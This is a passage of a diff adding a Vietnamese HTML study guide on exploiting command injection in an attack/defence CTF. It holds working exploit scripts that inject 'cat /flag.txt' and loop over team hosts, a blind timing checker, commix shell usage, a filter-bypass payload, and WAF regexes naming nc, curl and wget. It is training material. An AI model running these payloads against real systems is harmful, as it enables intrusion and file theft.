+    <tr><td><code>--os-cmd="lệnh"</code></td><td>Chạy đúng 1 lệnh, in kết quả ra — dùng khi chỉ cần lấy flag nhanh</td></tr>
+    <tr><td><code>--os-shell</code></td><td>Mở phiên tương tác kiểu shell thật, gõ lệnh trực tiếp</td></tr>
+    <tr><td><code>--technique=classic,time,file</code></td><td>Ép commix chỉ thử các kỹ thuật chỉ định (bỏ bớt để nhanh hơn khi đã đoán được loại nào ăn)</td></tr>
+  </table>
+  <div class="note tip"><span class="tag">Giới hạn trong A/D — vẫn cần script riêng</span>
+  commix chậm hơn script tự viết khi cần lặp qua nhiều đội mỗi round. Workflow đúng: dùng commix
+  <strong>1 lần</strong> để xác nhận + tìm đúng payload/ký tự phân cách ăn, rồi copy payload đó vào script Python
+  nhẹ ở mục 08 để lặp nhanh.</div>
+
+  <h3>C. CyberChef — giải mã/mã hóa payload khi cần né filter hoặc đọc output</h3>
+  <div class="def"><b>CyberChef</b> — một trang web (chạy được hoàn toàn offline, không cần server) để
+  <strong>biến đổi dữ liệu qua lại</strong> giữa các định dạng: encode/decode Base64, URL-encode, hex, rot13...
+  bằng cách kéo-thả khối lệnh (gọi là "recipe"), không cần viết code.</div>
+  <p>Đã tải sẵn tại <code>~/hoc/CTF/Tools/web/CyberChef/CyberChef_v11.6.0.html</code> — mở file này bằng trình duyệt bất
+  kỳ (double-click hoặc <code>firefox ~/hoc/CTF/Tools/web/CyberChef/CyberChef_v11.6.0.html</code>), không cần mạng.</p>
+  <table>
+    <tr><th>Tình huống trong bài này</th><th>Làm gì trong CyberChef</th></tr>
+    <tr><td>Output lệnh bị server tự Base64-encode trước khi trả về (hay gặp khi app "cẩn thận" hiển thị output an toàn)</td><td>Kéo khối <strong>From Base64</strong> vào Output, dán chuỗi mã hóa vào Input → đọc text gốc ngay lập tức</td></tr>
+    <tr><td>Cần gửi payload có ký tự đặc biệt qua URL mà không muốn tự tính tay mã <code>%xx</code></td><td>Kéo khối <strong>URL Encode</strong>, dán payload gốc vào Input → copy kết quả dán vào Burp</td></tr>
+    <tr><td>Blind injection, muốn exfiltrate flag qua DNS (mỗi label domain tối đa 63 ký tự, không dấu đặc biệt)</td><td>Dùng khối <strong>To Hex</strong> hoặc <strong>To Base32</strong> (Base32 chỉ dùng chữ+số, an toàn cho DNS label) trên payload <code>cat /flag.txt</code> trước khi nhét vào lệnh exfiltrate ở mục 06.B</td></tr>
+    <tr><td>Nghi ngờ WAF chặn theo pattern, muốn thử payload đã mã hóa</td><td>Kéo khối <strong>Rot13</strong>/<strong>XOR</strong> kết hợp decode phía payload nếu challenge có endpoint tự giải mã trước khi exec (hiếm nhưng gặp trong challenge khó)</td></tr>
+  </table>
+  <div class="note">CyberChef không tự tấn công — nó chỉ là "máy tính bỏ túi" biến đổi dữ liệu, giúp bạn không phải
+  tự tính tay mã hex/base64/url-encode mỗi lần cần, nhanh hơn nhiều so với tra Google (vốn không có trong phòng thi).</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET/ping"</span>
+
+<span class="c"># Bước 1: xác nhận có command injection</span>
+r = requests.get(url, params={<span class="s">"ip"</span>: <span class="s">"127.0.0.1; id"</span>})
+<span class="k">print</span>(<span class="s">"uid="</span> <span class="k">in</span> r.text)   <span class="c"># True = trúng</span>
+
+<span class="c"># Bước 2: đọc flag trực tiếp</span>
+r = requests.get(url, params={<span class="s">"ip"</span>: <span class="s">"127.0.0.1; cat /flag.txt"</span>})
+<span class="k">print</span>(r.text)</code></pre>
+
+  <h3>(B) Bản gọn chắc — dùng thực chiến, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+
+<span class="k">def</span> <span class="d">exploit_cmdi</span>(host):
+    r = requests.get(<span class="s">f"http://{host}/ping"</span>,
+            params={<span class="s">"ip"</span>: <span class="s">"127.0.0.1; cat /flag.txt"</span>}, timeout=5)
+    m = FLAG_RE.search(r.text)
+    <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_cmdi(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PAYLOAD = <span class="s">"127.0.0.1; cat /flag.txt"</span>
+
+<span class="k">def</span> <span class="d">exploit_cmdi</span>(host):
+    <span class="k">try</span>:
+        r = requests.get(<span class="s">f"http://{host}/ping"</span>, params={<span class="s">"ip"</span>: PAYLOAD}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_cmdi(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+
+  <h3>Script blind (time-based) — khi output không hiện ra</h3>
+  <pre><code><span class="k">import</span> time, requests
+
+<span class="k">def</span> <span class="d">is_vulnerable_blind</span>(host):
+    url = <span class="s">f"http://{host}/ping"</span>
+    t0 = time.time()
+    requests.get(url, params={<span class="s">"ip"</span>: <span class="s">"127.0.0.1; sleep 5"</span>}, timeout=8)
+    elapsed = time.time() - t0
+    <span class="k">return</span> elapsed > 4.5
+
+<span class="k">if</span> is_vulnerable_blind(<span class="s">"TARGET_IP"</span>):
+    <span class="k">print</span>(<span class="s">"Dính blind command injection -> dùng commix --os-shell để khai thác tiếp"</span>)</code></pre>
+  <div class="note tip"><span class="tag">Mức tự động của script này</span>Script blind trên chỉ <strong>xác nhận
+  có lỗ hổng</strong> (đo thời gian), không tự đọc được flag vì output không hiện ra màn hình. Xác nhận xong →
+  dùng <strong>commix --os-shell</strong> (mục 07.B) để thực sự đọc file, không cố tự viết thêm script exfil phức
+  tạp làm gì khi đã có công cụ chuyên dụng.</div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service có trang "Network Diagnostic Tool", form nhập IP/domain, nút "Ping".</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Nhận diện</div><div class="d">Burp bắt <code>POST /diagnostic</code>, body <code>host=8.8.8.8</code>. Repeater, sửa <code>host=8.8.8.8; id</code> → Response thêm dòng <code>uid=1000(ctf) gid=1000(ctf)</code> ⟹ xác nhận, dùng được <code>;</code>, chạy quyền user <code>ctf</code>.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Tìm flag</div><div class="d"><code>host=8.8.8.8; find / -iname "flag*" 2>/dev/null</code> → Response hiện đường dẫn <code>/flag_a1b2c3.txt</code>.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Đọc flag</div><div class="d"><code>host=8.8.8.8; cat /flag_a1b2c3.txt</code> → Response hiện <code>FHACKER2026{64 ký tự hex}</code>.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Tự động hóa</div><div class="d">Dán payload đã xác nhận vào script (C) mục 08, chạy qua danh sách IP các đội mỗi round (lưu ý: tên file flag có thể khác mỗi đội/round — nếu vậy dùng <code>find</code> trước rồi <code>cat</code> theo kết quả, hoặc kiểm tra xem flag có nằm ở path cố định không).</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex)</th><th>Khớp gì</th></tr>
+    <tr><td><code>[;&amp;|`]\s*(cat|id|whoami|ls|pwd|nc|bash|sh|curl|wget)\b</code></td><td>Ký tự phân cách shell đi kèm ngay sau là lệnh hệ thống thường dùng để do thám/đọc file</td></tr>
+    <tr><td><code>\$\(.*\)</code></td><td>Cú pháp <code>$(lệnh)</code> — command substitution</td></tr>
+    <tr><td><code>\$\{IFS\}|\$IFS\$</code></td><td>Kỹ thuật né bộ lọc khoảng trắng bằng biến môi trường <code>IFS</code></td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Tránh chặn nhầm (quy chế A/D)</span>
+  <strong>Không</strong> chặn mọi dấu <code>;</code> hay <code>|</code> nếu tham số đó hợp lệ chứa ký tự này (hiếm
+  nhưng có thể, vd input tự do). Luôn bật <strong>DetectionOnly</strong> trước, xem traffic log thật rồi mới
+  chuyển sang block — tránh trường hợp chặn nhầm request của chính bot healthcheck.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Không thấy output gì thêm, cũng không chậm hơn khi sleep</td><td>Tham số không thực sự vào shell (có thể bị validate/ép kiểu)</td><td>Thử tham số khác trong cùng request; kiểm tra lại có đúng response trả về nội dung lệnh không (có thể server log ra chỗ khác, không in ra response)</td></tr>
+    <tr><td>Output bị cắt cụt</td><td>Server giới hạn độ dài response hoặc chỉ hiện vài dòng đầu</td><td>Dùng <code>head -c 50</code>/chia nhỏ output, hoặc exfiltrate qua kênh khác (DNS/HTTP callback, xem mục 06.B)</td></tr>
+    <tr><td>Dùng <code>;</code> không ăn nhưng <code>|</code> hoặc <code>&amp;&amp;</code> lại ăn</td><td>App dùng <code>shell=True</code> nhưng chỉ validate/chặn 1 vài ký tự cụ thể</td><td>Thử lần lượt toàn bộ danh sách ký tự phân cách ở mục 06.A, đừng dừng lại ở ký tự đầu tiên thất bại</td></tr>
+    <tr><td>commix báo "not injectable" dù bạn chắc chắn có lỗ hổng</td><td>commix mặc định không thử hết mọi kỹ thuật/ký tự ở mức nhẹ</td><td>Thêm <code>--level=3</code> hoặc chỉ định cụ thể <code>--technique=classic</code>, hoặc tự thử tay theo mục 06 trước để biết ký tự nào ăn rồi truyền gợi ý cho commix</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App gọi lệnh shell bằng cách nối chuỗi (<code>os.system</code>, <code>os.popen</code>, Python <code>subprocess</code> với <code>shell=True</code> và f-string, PHP <code>exec()</code>/<code>system()</code> với biến ghép thẳng).</td></tr>
+    <tr><td>❌</td><td>App gọi chương trình ngoài bằng <strong>argv array</strong>, không qua shell (Python <code>subprocess.run(["ping","-c","1",ip])</code> không có <code>shell=True</code>) — tham số được truyền thẳng làm 1 argument, không còn cú pháp shell để chèn thêm lệnh.</td></tr>
+    <tr><td>❌</td><td>Input được validate nghiêm ngặt theo whitelist (chỉ cho qua IP đúng định dạng regex <code>^\d+\.\d+\.\d+\.\d+$</code>) trước khi vào lệnh.</td></tr>
+  </table>
+  <div class="note">Nếu không ăn, kiểm tra xem app có đang dùng <code>shell=False</code>/argv-array không — lúc đó
+  command injection kiểu cổ điển này không khai thác được nữa, cần tìm lỗ hổng khác.</div>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay trên Burp, từ gõ IP bình thường tới khi thấy flag
+  trong Response.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ thử hết các ký tự phân cách ở mục 06.A, đừng dừng ở <code>;</code>
+  nếu nó không ăn.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> giả sử output không hiện ra màn hình (chỉ có "Ping thành công"/"Ping thất
+  bại"). Dùng commix hoặc script blind ở mục 08 để xác nhận, rồi dùng <code>commix --os-shell</code> đọc flag.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Dùng <code>&amp;&amp;</code>/<code>||</code> kết hợp <code>sleep</code>
+  để vừa xác nhận vừa biết điều kiện trước đó đúng/sai.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> challenge chặn toàn bộ khoảng trắng và các ký tự <code>;|&amp;`</code>.
+  Viết payload đọc được <code>/flag.txt</code> chỉ dùng <code>$()</code>, <code>${IFS}</code> và wildcard.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Thử: <code>$(cat${IFS}/fl?g*)</code> — kết hợp command substitution +
+  biến IFS thay khoảng trắng + wildcard thay tên file không biết chính xác.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Shell metacharacter</td><td>Ký tự có ý nghĩa đặc biệt với shell (<code>; | &amp; ` $</code>...), không phải chữ thường.</td></tr>
+    <tr><td>RCE</td><td>Remote Code Execution — chạy được lệnh tùy ý trên máy chủ từ xa.</td></tr>
+    <tr><td>Blind injection</td><td>Lỗ hổng tồn tại nhưng output không hiển thị trực tiếp, phải suy luận qua thời gian/hành vi khác.</td></tr>
+    <tr><td>Argv array</td><td>Cách gọi chương trình ngoài bằng danh sách tham số tách sẵn, không qua shell — miễn nhiễm với command injection kiểu cổ điển.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/commix/</code>, <code>~/hoc/CTF/Tools/web/CyberChef/</code>,
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Command Injection/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("cmdi-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("cmdi-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
